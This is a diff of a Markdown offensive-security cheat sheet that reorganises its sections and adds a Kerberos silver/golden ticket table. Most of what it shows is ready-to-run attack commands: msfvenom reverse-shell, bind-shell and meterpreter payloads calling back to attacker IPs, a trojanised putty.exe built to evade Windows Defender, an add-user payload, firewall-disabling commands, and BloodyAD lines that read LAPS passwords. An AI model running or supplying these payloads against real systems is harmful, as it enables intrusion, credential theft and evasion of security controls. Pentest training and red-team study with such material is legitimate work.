@@ -17,9 +17,10 @@
 - [11. MSSQLPwner](#MSSQLPwner)
 - [12. PowerUPSQL](#PowerUPSQL)
 - [13. NTLM Relay](#NTLM-Relay)
-- [14. MSFVenom Payload Generation Cheetsheet](#MSFVenom-Payload-Generation-Cheetsheet)
-- [15. Domain Enumeration](#Domain-Enumeration)
-- [16. BloodyAD Cheetsheet](#BloodyAD-Cheetsheet)
+- [14. Domain Enumeration](#Domain-Enumeration)
+- [15. TGS Abuse](#TGS-Abuse)
+- [15. BloodyAD Cheetsheet](#BloodyAD-Cheetsheet)
+- [16. MSFVenom Payload Generation Cheetsheet](#MSFVenom-Payload-Generation-Cheetsheet)
 
 # Tunneling - Ligolo-NG
 
@@ -79,7 +80,6 @@ $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c
 | Description                                        | Command                                                                               |
 | -------------------------------------------------- | ------------------------------------------------------------------------------------- |
 | Disable firewall - New way                         | `netsh advfirewall set allprofiles state off`                                         |
-|                                                    |                                                                                       |
 | Disable Firewall - Old way                         | `netsh firewall set opmode disable`                                                   |
 | Disable firewall service (can only run as SYSTEM?) | `net stop mpssvc`                                                                     |
 | Current firewall profile                           | `netsh advfirewall show currentprofile`                                               |
@@ -300,28 +300,7 @@ MSSQLPwner:
 
 impacket: 
 
-- `xp_dirtree \\192.168.45.196\blabla`
-
-# MSFVenom Payload Generation Cheetsheet
-
-| Name                            | Payload                                                                                                                                                                                                                        |
-| ------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
-| msfvenom DLL 64bit              | `msfvenom -p windows/x64/shell_reverse_tcp -ax64 -f dll LHOST=192.168.137.130 LPORT=9500 > reverse_64bit.dll`                                                                                                                  |
-| msfvenom DLL 32bit              | `msfvenom -p windows/reverse_tcp -ax86 -f dll LHOST=192.168.137.130 LPORT=9500 > reverse_32bit.dll`                                                                                                                            |
-| BASH Reverse shell              | `msfvenom -p cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw > shell.sh`                                                                                                                                                      |
-| JSP shell                       | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.jsp`                                                                                                                                                |
-| Linux Reverse Shell             | `msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf`                                                                                                                                               |
-| Windows add user                | `msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe`                                                                                                                                                   |
-| HTA Reverse Shell               | `sudo msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f hta-psh -o evil.hta`                                                                                                                                        |
-| Staged Payload for Windows x86  | `msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell-x86.exe`                                                                                                                                        |
-| Staged Payloads for Windows x64 | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell-x64.exe`                                                                                                                                    |
-| CMDEXEC                         | `msfvenom -p windows/exec CMD="Your Command Here" -f exe -o shell.exe`                                                                                                                                                         |
-| bind shell - x64                | `msfvenom -p windows/x64/shell_bind_tcp LPORT=50001 RHOST=10.11.1.75 --platform windows -a x64 --format raw -o sc_x64_payload.bin`                                                                                             |
-| Linux - x86 reverse shell       | `msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf`                                                                                                                                       |
-| Linux - x64 reverse shell       | `msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf`                                                                                                                                       |
-| Putty.exe WinDef Bypass         | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.175 LPORT=8443 EXITFUNC=thread PREPENDMIGRATE=true PREPENDMIGRATEPROC=explorer.exe -f exe -o /mnt/Projects/test4.exe -e x64/xor_dynamic -i 10 -x ./putty.exe -k` |
-| 64bit Staged Shellcode          | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.100.102.188 LPORT=9001 -f c`                                                                                                                                         |
-| 64bit NonStaged Shellcode       | `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.100.102.188 LPORT=9001 -f c`                                                                                                                                         |
+- `xp_dirtree \\192.168.45.196\blabla`                                                                                                                            |
 
 # Domain Enumeration
 
@@ -371,6 +350,17 @@ impacket:
 - `Get-NetForestDomain -Forest eurocorp.local -Verbose | Get-NetDomainTrust` - Enumerate trusts for a trusting domain.
 - `Get-NetGPOGroup` -  Get GPO's which use Restricted Groups or groups.xml for interesting users.
 
+# TGS Abuse
+
+|     Service Type          |   Service Silver Tickets |
+| ------------------------- | ------------------------ |
+| WMI                       | Host, RPCSS              |
+| PowerShell Remoting       | HOST,HTTP                |
+| WinRM                     | HOST,HTTP,WINRM          |
+| Scheduled Tasks           | HOST                     |
+| Windows File Share/PSEXEC | CIFS                     |
+| Golden Tickets            | krbtgt                   |
+
 # BloodyAD Cheetsheet
 
 | **Purpose**                                           | **Command**                                                                                                                              |
@@ -385,3 +375,24 @@ impacket:
 | Add The TRUSTED_TO_AUTH_FOR_DELEGATION Flag           | `bloodyAD --host $dc -d $domain -u $username -p $password add uac $target_username -f TRUSTED_TO_AUTH_FOR_DELEGATION`                    |
 | Read LAPS Password                                    | `bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime` |
 | Read LAPS Password (Kerberos Auth)                    | `KRB5CCNAME=ted.ccache bloodyAD -k --dc-ip "192.168.202.120" --host dc03.infinity.com -d "infinity.com" get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime` |
+
+# MSFVenom Payload Generation Cheetsheet
+
+| Name                            | Payload                                                                                                                                                                                                                        |
+| ------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
+| msfvenom DLL 64bit              | `msfvenom -p windows/x64/shell_reverse_tcp -ax64 -f dll LHOST=192.168.137.130 LPORT=9500 > reverse_64bit.dll`                                                                                                                  |
+| msfvenom DLL 32bit              | `msfvenom -p windows/reverse_tcp -ax86 -f dll LHOST=192.168.137.130 LPORT=9500 > reverse_32bit.dll`                                                                                                                            |
+| BASH Reverse shell              | `msfvenom -p cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw > shell.sh`                                                                                                                                                      |
+| JSP shell                       | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.jsp`                                                                                                                                                |
+| Linux Reverse Shell             | `msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf`                                                                                                                                               |
+| Windows add user                | `msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe`                                                                                                                                                   |
+| HTA Reverse Shell               | `sudo msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f hta-psh -o evil.hta`                                                                                                                                        |
+| Staged Payload for Windows x86  | `msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell-x86.exe`                                                                                                                                        |
+| Staged Payloads for Windows x64 | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell-x64.exe`                                                                                                                                    |
+| CMDEXEC                         | `msfvenom -p windows/exec CMD="Your Command Here" -f exe -o shell.exe`                                                                                                                                                         |
+| bind shell - x64                | `msfvenom -p windows/x64/shell_bind_tcp LPORT=50001 RHOST=10.11.1.75 --platform windows -a x64 --format raw -o sc_x64_payload.bin`                                                                                             |
+| Linux - x86 reverse shell       | `msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf`                                                                                                                                       |
+| Linux - x64 reverse shell       | `msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf`                                                                                                                                       |
+| Putty.exe WinDef Bypass         | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.175 LPORT=8443 EXITFUNC=thread PREPENDMIGRATE=true PREPENDMIGRATEPROC=explorer.exe -f exe -o /mnt/Projects/test4.exe -e x64/xor_dynamic -i 10 -x ./putty.exe -k` |
+| 64bit Staged Shellcode          | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.100.102.188 LPORT=9001 -f c`                                                                                                                                         |
+| 64bit NonStaged Shellcode       | `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.100.102.188 LPORT=9001 -f c`             
